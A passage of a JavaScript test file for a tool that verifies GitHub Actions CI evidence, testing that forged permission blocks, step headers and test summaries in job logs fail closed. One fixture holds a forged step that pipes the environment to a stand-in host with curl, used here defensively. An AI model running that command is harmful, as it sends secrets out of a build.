  assert.match(b.consistency.find((c) => c.id === "log.permission_block_is_single_and_initial").detail, /2 GITHUB_TOKEN Permissions block/);
  // a forged write block after a genuine read-only one: the genuine one is still what is reported, and the evidence still fails
  const worse = live();
  worse.log = printedBy(worse.log, "##[group]Run npm run lint", BLOCK("write"));
  const c = ci(worse);
  assert.equal(c.token_permissions.permissions[0].access, "read");
  assert.deepEqual(blocking(c), ["log.permission_block_is_single_and_initial"]);
});

test("F-1: a permission block that comes after a step has started is not the runner's, and is never read", () => {
  const d = live();
  d.log = d.log.replace(/##\[group\]GITHUB_TOKEN Permissions\n[^]*?##\[endgroup\]\n/, "");
  d.log = printedBy(d.log, "##[group]Run npm run lint", BLOCK("read"));
  const result = ci(d);
  assert.equal(result.token_permissions, null, "nothing verified, so nothing is reported as the token's permissions");
  assert.deepEqual(blocking(result).sort(), ["log.permission_block_is_single_and_initial", "log.token_is_read_only"]);
  assert.match(result.consistency.find((c) => c.id === "log.token_is_read_only").detail, /came after a step header/);
});

test("F-1: a forged test header with a forged TAP summary cannot replace the real test evidence, and fails the evidence", () => {
  // printed inside the Build step: the old parser re-entered the test step's segment and the last summary won
  const d = live();
  d.log = printedBy(d.log, "##[group]Run npm run build", `##[group]Run npm run ops:test\n${TAP(99999)}`);
  const result = ci(d);
  assert.deepEqual([result.test_evidence.tests, result.test_evidence.pass, result.test_evidence.fail], [353, 353, 0], "the real summary stays; the forged one joined no segment");
  assert.deepEqual(blocking(result), ["log.run_headers_not_repeated"]);
  // printed EARLIER, by a step that runs before the real one: the forged segment is now the first one, and the real header is the repeat
  const early = live();
  early.log = printedBy(early.log, "##[group]Run npm run lint", `##[group]Run npm run build\nGenerating static pages (1/1)\n`);
  const e = ci(early);
  assert.deepEqual(blocking(e).sort(), ["log.run_headers_are_expected_and_in_order", "log.run_headers_not_repeated"], "either copy of a header makes the evidence fail, and the early copy is also out of order");
  // the same, for the validation step's summary
  const validation = live();
  validation.log = printedBy(validation.log, "##[group]Run npm run build", "##[group]Run npm run ops:validate\nOK: checked 1 file(s); 0 warning(s).\n");
  assert.deepEqual(blocking(ci(validation)), ["log.run_headers_not_repeated"]);
  assert.equal(ci(validation).test_evidence.validate_files_checked, 93);
});

test("F-1: a repeated header never lets later text join an earlier verified segment", () => {
  const d = live();
  const forged = "# tests 424242\n# pass 424242\n# fail 0\n";
  d.log = printedBy(d.log, "##[group]Run npm run build", `##[group]Run npm run lint\n${forged}`);
  const parsed = parseJobLog(d.log);
  assert.deepEqual(parsed.repeated_run_headers, ["npm run lint"]);
  assert.ok(!parsed.segments.get("npm run lint").some((l) => /424242/.test(l)), "the forged lines are in no segment");
  assert.ok(!parsed.segments.get("npm run build").some((l) => /424242/.test(l)), "and not in the segment of the step that printed them");
  for (const [name, lines] of parsed.segments) assert.ok(!lines.some((l) => /424242/.test(l)), `not in ${name}`);
});

test("F-1: the first occurrence wins in the parser: later content never overwrites an earlier result", () => {
  const readThenWrite = parseJobLog(`${BLOCK("read")}##[group]Run npm run lint\n${BLOCK("write")}`);
  assert.deepEqual(readThenWrite.permissions, [{ scope: "contents", access: "read" }, { scope: "metadata", access: "read" }]);
  assert.equal(readThenWrite.permission_blocks, 2);
  const writeThenRead = parseJobLog(`${BLOCK("write")}##[group]Run npm run lint\n${BLOCK("read")}`);
  assert.equal(writeThenRead.permissions[0].access, "write", "the first block is kept even when a later one looks better");
  const late = parseJobLog(`##[group]Run npm run lint\n${BLOCK("read")}`);
  assert.equal(late.permissions, null);
  assert.equal(late.permission_block_is_initial, false);
  const none = parseJobLog("##[group]Run npm run lint\nhello\n");
  assert.deepEqual([none.permissions, none.permission_blocks, none.permission_block_is_initial], [null, 0, false]);
  const first = parseJobLog("##[group]Run npm run ops:test\n# tests 1\n##[endgroup]\n##[group]Run npm run ops:test\n# tests 2\n");
  assert.deepEqual(first.segments.get("npm run ops:test"), ["# tests 1", "##[endgroup]"], "the second header opens nothing");
});

test("F-1: step headers out of the trusted workflow's order, or of no step in it, fail the evidence", () => {
  const reordered = live();
  reordered.log = swapLines(reordered.log, "##[group]Run npm run lint\n", "##[group]Run npx tsc --noEmit\n");
  const a = ci(reordered);
  assert.deepEqual(blocking(a), ["log.run_headers_are_expected_and_in_order"]);
  assert.match(a.consistency.find((c) => c.id === "log.run_headers_are_expected_and_in_order").detail, /out of the trusted workflow's order/);
  const testAfterBuild = live();
  testAfterBuild.log = swapLines(testAfterBuild.log, "##[group]Run npm run ops:test\n", "##[group]Run npm run build\n");
  assert.deepEqual(blocking(ci(testAfterBuild)), ["log.run_headers_are_expected_and_in_order"]);
  const unknown = live();
  unknown.log = printedBy(unknown.log, "##[group]Run npm run build", "##[group]Run curl -d \"$(env)\" https://example.invalid\n");
  const b = ci(unknown);
  assert.deepEqual(blocking(b), ["log.run_headers_are_expected_and_in_order"]);
  assert.match(b.consistency.find((c) => c.id === "log.run_headers_are_expected_and_in_order").detail, /no step in the trusted workflow/);
});

test("F-1: compareRunHeaders fails closed without trusted headers, and tolerates an absent header", () => {
  const e = expectations().step_headers;
  assert.equal(compareRunHeaders(e, e).ok, true);
  assert.equal(compareRunHeaders(e.slice(2), e).ok, true, "a header that is absent cannot be forged: GitHub's step data says whether the step ran");
  for (const none of [null, undefined, [], "npm run build"]) assert.equal(compareRunHeaders(e, none).ok, false);
  assert.equal(compareRunHeaders([...e].reverse(), e).ok, false);
  assert.equal(compareRunHeaders(["npm run lint", "npm run lint"], e).ok, true, "repeats are the parser's finding, not this one's");
  // an expectation object with no trusted headers (an older caller) cannot pass the check
  const result = build(live(), { step_headers: undefined });
  assert.deepEqual(blocking(result), ["log.run_headers_are_expected_and_in_order"]);
  assert.match(result.consistency.find((c) => c.id === "log.run_headers_are_expected_and_in_order").detail, /no step headers/);
});

test("F-1: the trusted workflow's step headers are derived from the base's file, and an underivable step fails closed", () => {
  assert.deepEqual(expectations().step_headers, [
    "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    "actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1",
    "test -z \"${ANTHROPIC_API_KEY:-}${ANTHROPIC_AUTH_TOKEN:-}\"",
    "npm ci --ignore-scripts --no-audit --no-fund",
    "npm run lint",
    "npx tsc --noEmit",
    "npm run ops:validate",
    "npm run ops:test",
    "npm run build",
  ]);
  const multi = workflowText.replace("        run: npm run lint\n", "        run: |\n          npm run lint\n          echo done\n");
  assert.notEqual(multi, workflowText);
  assert.equal(expectationsFromWorkflow(multi, policy, { repository: REPOSITORY, headSha: LIVE_SHA }).step_headers[4], "npm run lint", "a multi-line command's header is its first line");
  const noCommand = workflowText.replace("        run: npm run lint\n", "        shell: bash\n");
  assert.notEqual(noCommand, workflowText);
  assert.equal(expectationsFromWorkflow(noCommand, policy, { repository: REPOSITORY, headSha: LIVE_SHA }).step_headers, null);
});

test("F-1: legitimate logs still pass: timestamps, CRLF, ANSI colour and a byte-order mark change nothing", () => {
  const stamp = (log) => log.split("\n").map((l, i) => `2026-11-17T12:21:${String(i % 60).padStart(2, "0")}.4443101Z ${l}`).join("\n");
  const variants = {
    "as stored": (l) => l,
    "timestamps": stamp,
    "CRLF": (l) => l.replaceAll("\n", "\r\n"),
    "ANSI colour": (l) => l.replace(/^npm run (lint|build)$/gm, "\u001b[36;1mnpm run $1\u001b[0m"),
    "byte-order mark": (l) => `﻿${l}`,
    "all at once": (l) => `﻿${stamp(l).replaceAll("\n", "\r\n")}`,
  };
  const base = ci(live());
  for (const [name, mutate] of Object.entries(variants)) {
    const d = live();
    d.log = mutate(d.log);
    const result = ci(d);
    assert.deepEqual(failed(result), [], name);
    assert.deepEqual(result.test_evidence, base.test_evidence, name);
    assert.deepEqual(result.token_permissions, base.token_permissions, name);
  }
});

test("F-1: GitHub's step data stays the primary evidence: a clean-looking log cannot rescue a step that failed", () => {
  const d = live();
  jobOf(d).steps.find((s) => s.name === "Build").conclusion = "failure";
  const result = ci(d);
  assert.deepEqual(failed(result), ["steps.all_succeeded"], "the log is spotless, the step data is not");
  assert.deepEqual(blocking(result), ["steps.all_succeeded"]);
  const doc = documentFor("clean-docs", { mutate: (x) => { jobOf(x).steps.find((s) => s.name === "Build").conclusion = "failure"; } });
  assert.equal(doc.verdict.ci_passed, false);
  assert.equal(doc.github_ci.test_evidence.authority, "claim_by_output_of_the_code_under_test");
});

/* ------------------------------------------------------------------------------------------- F-2 */

const inputs = (over) => (x) => Object.assign(x, over);

test("F-2: with every mandatory input the evidence is complete and says nothing is missing", () => {
  const doc = documentFor("clean-docs");
  assert.deepEqual(doc.verdict.missing_evidence, []);
  assert.equal(doc.verdict.evidence_complete, true);
  assert.equal(doc.verdict.ci_passed, true);
  for (const id of MANDATORY) assert.ok(doc.github_ci.consistency.find((c) => c.id === id && c.blocking && c.passed), id);
  assert.deepEqual(validate(schema, doc).errors, []);
});

test("F-2: run and jobs alone cannot read complete or passed: the skipped checks are recorded, and the gap is listed", () => {
  const doc = documentFor("clean-docs", { mutate: inputs({ checks: null, log: null }) });
  assert.equal(doc.verdict.ci_passed, false, "not established as passed is not passed");
  assert.equal(doc.verdict.evidence_complete, false);
  assert.deepEqual(doc.verdict.missing_evidence, ["check_runs", "job_log"]);
  assert.equal(doc.verdict.human_review_required, true);
  for (const id of MANDATORY) {
    const c = doc.github_ci.consistency.find((x) => x.id === id);
    assert.ok(c, `${id} is in the document, not silently absent`);
    assert.deepEqual([c.passed, c.blocking], [false, true], id);
    assert.match(c.detail, /^not run: /, id);
  }
  assert.ok(doc.verdict.reasons.some((r) => /^mandatory evidence missing: check-run data and the job log;/.test(r)), doc.verdict.reasons.join(" | "));
  assert.ok(!doc.verdict.reasons.some((r) => /^CI evidence check failed: .*not run/.test(r)), "one explicit line, not one alarming line per skipped check");
  // partial observations stay accurate
  assert.equal(doc.github_ci.workflow_run.conclusion, "success");
  assert.equal(doc.github_ci.jobs[0].conclusion, "success");
  assert.equal(doc.github_ci.jobs[0].steps.filter((s) => s.conclusion === "success").length >= 9, true);
  assert.deepEqual([doc.github_ci.checks, doc.github_ci.token_permissions, doc.github_ci.test_evidence], [null, null, null]);
  assert.deepEqual(failed(doc.github_ci).filter((id) => !MANDATORY.includes(id)), [], "no other check failed: only the skipped ones");
  assert.deepEqual(validate(schema, doc).errors, []);
});

test("F-2: each missing input is identified on its own", () => {
  const noLog = documentFor("clean-docs", { mutate: inputs({ log: null }) });
  assert.deepEqual(noLog.verdict.missing_evidence, ["job_log"]);
  assert.deepEqual([noLog.verdict.ci_passed, noLog.verdict.evidence_complete], [false, false]);
  assert.deepEqual(blockingIds(noLog), ["log.permission_block_is_single_and_initial", "log.run_headers_are_expected_and_in_order", "log.run_headers_not_repeated", "log.token_is_read_only"]);
  assert.equal(noLog.github_ci.consistency.find((c) => c.id === "checks.match_jobs_from_actions_app").passed, true, "the check runs that were supplied are still checked");
  const noChecks = documentFor("clean-docs", { mutate: inputs({ checks: null }) });
  assert.deepEqual(noChecks.verdict.missing_evidence, ["check_runs"]);
  assert.deepEqual([noChecks.verdict.ci_passed, noChecks.verdict.evidence_complete], [false, false]);
  assert.deepEqual(blockingIds(noChecks), ["checks.match_jobs_from_actions_app"]);
  assert.equal(noChecks.github_ci.token_permissions.permissions.length, 2, "the log that was supplied is still read");
  const noBase = documentFor("clean-docs", { ci: true, mutate: () => {} });
  assert.deepEqual(noBase.verdict.missing_evidence, []);
  const onlyBase = documentFor("clean-docs", { ci: false });
  assert.deepEqual(onlyBase.verdict.missing_evidence, ["github_run_data", "check_runs", "job_log"]);
  assert.equal(onlyBase.verdict.ci_passed, null, "null stays reserved for 'no GitHub data at all'");
  const githubOnly = buildEvidenceDocument({ repository: REPOSITORY, headSha: LIVE_SHA, githubCi: build(live()), collector: COLLECTOR, now: NOW });
  assert.deepEqual(githubOnly.verdict.missing_evidence, ["trusted_base"]);
  assert.equal(githubOnly.verdict.evidence_complete, false);
});
const blockingIds = (doc) => doc.github_ci.consistency.filter((c) => c.blocking && !c.passed).map((c) => c.id).sort();

test("F-2: malformed input is refused or fails closed, never skipped", () => {
  const d = live();
  throwsEv(() => buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: {}, jobLog: d.log, expected: expectations() }), "EV-SHAPE");
  throwsEv(() => buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: d.checks, jobLog: 42, expected: expectations() }), "EV-SHAPE");
  throwsEv(() => buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: "no", jobLog: d.log, expected: expectations() }), "EV-SHAPE");
  // supplied but empty or foreign: supplied, so not "missing", but they prove nothing and the evidence fails
  const emptyChecks = documentFor("clean-docs", { mutate: (x) => { x.checks.check_runs = []; } });
  assert.deepEqual(emptyChecks.verdict.missing_evidence, []);
  assert.equal(emptyChecks.verdict.ci_passed, false);
  for (const log of ["", "\n", "hello\nthis is not a GitHub Actions log\n", "##[group]Run npm run build\n"]) {
    const doc = documentFor("clean-docs", { mutate: inputs({ log }) });
    assert.deepEqual(doc.verdict.missing_evidence, [], JSON.stringify(log));
    assert.equal(doc.verdict.ci_passed, false, JSON.stringify(log));
    assert.equal(doc.verdict.evidence_complete, false, JSON.stringify(log));
    assert.ok(blockingIds(doc).includes("log.token_is_read_only"), JSON.stringify(log));
  }
});

test("F-2: contradictory input sets fail the evidence without being called missing", () => {
  const otherCommit = documentFor("clean-docs", { mutate: (x) => { x.run.head_sha = "e".repeat(40); } });
  assert.deepEqual(otherCommit.verdict.missing_evidence, []);
  assert.deepEqual([otherCommit.verdict.ci_passed, otherCommit.verdict.evidence_complete], [false, false]);
  const checkSaysFailed = documentFor("clean-docs", { mutate: (x) => { x.checks.check_runs[0].conclusion = "failure"; } });
  assert.deepEqual([checkSaysFailed.verdict.ci_passed, checkSaysFailed.verdict.evidence_complete, checkSaysFailed.verdict.missing_evidence], [false, false, []]);
  const logWritesToken = documentFor("clean-docs", { mutate: (x) => { x.log = writeAccess(x.log); } });
  assert.deepEqual([logWritesToken.verdict.ci_passed, logWritesToken.verdict.evidence_complete], [false, false]);
  const stepsAndRunDisagree = documentFor("clean-docs", { mutate: (x) => { x.run.conclusion = "failure"; } });
  assert.deepEqual([stepsAndRunDisagree.verdict.ci_passed, stepsAndRunDisagree.verdict.evidence_complete], [false, false]);
});

test("F-2: a GitHub section from elsewhere that lacks a mandatory check can never read as passed or complete", () => {
  const head = sha("clean-docs");
  const d = live(head);
  const complete = buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: d.checks, jobLog: d.log, expected: expectations({ head_sha: head, branch: null }) });
  const trustedBase = trustedBaseCheck({ repoDir: repo.dir, base: "main", head });
  for (const id of MANDATORY) {
    const legacy = { ...complete, consistency: complete.consistency.filter((c) => c.id !== id) };
    const doc = buildEvidenceDocument({ repository: REPOSITORY, headSha: head, baseSha: sha("main"), trustedBase, githubCi: legacy, collector: COLLECTOR, now: NOW });
    assert.equal(doc.verdict.ci_passed, false, id);
    assert.equal(doc.verdict.evidence_complete, false, id);
    assert.ok(doc.verdict.reasons.some((r) => r.includes(`CI evidence check missing: ${id}`)), id);
  }
});

test("F-2: the schema accepts the current and the earlier verdict shape, and nothing looser", () => {
  const good = documentFor("clean-docs");
  assert.deepEqual(validate(schema, good).errors, []);
  const earlier = structuredClone(good);
  delete earlier.verdict.missing_evidence;
  assert.deepEqual(validate(schema, earlier).errors, [], "a document written before missing_evidence existed stays valid");
  const tamper = (fn) => {
    const doc = structuredClone(good);
    fn(doc);
    return validate(schema, doc).valid;
  };
  assert.equal(tamper((x) => { x.verdict.missing_evidence = ["something_else"]; }), false);
  assert.equal(tamper((x) => { x.verdict.missing_evidence = ["job_log", "job_log"]; }), false);
  assert.equal(tamper((x) => { x.verdict.missing_evidence = "none"; }), false);
  assert.equal(tamper((x) => { x.verdict.surprise = true; }), false);
  assert.equal(tamper((x) => { delete earlier.verdict.ci_passed; x.verdict = earlier.verdict; }), false);
  assert.equal(tamper((x) => { x.verdict.ci_trust_basis = "trusted"; }), false);
});

test("F-2 command line: partial inputs give ci passed false, name the missing evidence and ask for a human", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "m1-ci-cli-"));
  try {
    const head = sha("clean-docs");
    const d = live(head);
    const files = { run: path.join(dir, "run.json"), jobs: path.join(dir, "jobs.json"), checks: path.join(dir, "checks.json"), log: path.join(dir, "job.log") };
    fs.writeFileSync(files.run, JSON.stringify(d.run));
    fs.writeFileSync(files.jobs, JSON.stringify(d.jobs));
    fs.writeFileSync(files.checks, JSON.stringify(d.checks));
    fs.writeFileSync(files.log, d.log);
    const base = ["--repository", REPOSITORY, "--repo-dir", repo.dir, "--base", "main", "--head", "clean-docs", "--run", files.run, "--jobs", files.jobs];
    const partial = run(base);
    assert.equal(partial.code, 3, partial.err);
    assert.match(partial.err, /ci passed: false; .*evidence complete: false/);
    assert.match(partial.err, /missing mandatory evidence: check_runs, job_log/);
    const doc = JSON.parse(partial.out);
    assert.deepEqual([doc.verdict.ci_passed, doc.verdict.missing_evidence], [false, ["check_runs", "job_log"]]);
    assert.deepEqual(validate(schema, doc).errors, []);
    const noLog = run([...base, "--checks", files.checks]);
    assert.equal(noLog.code, 3);
    assert.match(noLog.err, /missing mandatory evidence: job_log\n/);
    const full = run([...base, "--checks", files.checks, "--log", files.log]);
    assert.equal(full.code, 0, full.err);
    assert.doesNotMatch(full.err, /missing mandatory evidence/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
